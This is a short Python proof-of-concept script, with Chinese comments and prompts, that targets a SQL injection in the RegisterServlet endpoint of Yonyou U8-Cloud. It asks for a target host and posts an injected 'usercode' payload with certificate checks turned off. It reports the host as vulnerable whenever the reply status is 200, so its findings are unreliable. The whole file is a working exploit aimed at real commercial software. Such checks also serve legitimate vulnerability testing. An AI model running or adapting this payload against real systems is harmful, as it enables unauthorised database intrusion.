```
import requests

def verify(ip):
url = f'{ip}/servlet/RegisterServlet'
headers = {
'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36',
'Connection': 'close',
'Content-Length': '85',
'Accept': '*/*',
'Accept-Language': 'en',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip',
}
payload = '''usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--'''
try:
response = requests.post(url, headers=headers, data=payload,verify=False)
# 验证成功输出相关信息
if response.status_code == 200 :
print(f"{ip}存在用友u8-cloud RegisterServlet SQL注入漏洞！！！")

except Exception as e:
pass


if __name__ == '__main__':
self = input('请输入目标主机IP地址：')
verify(self)
```

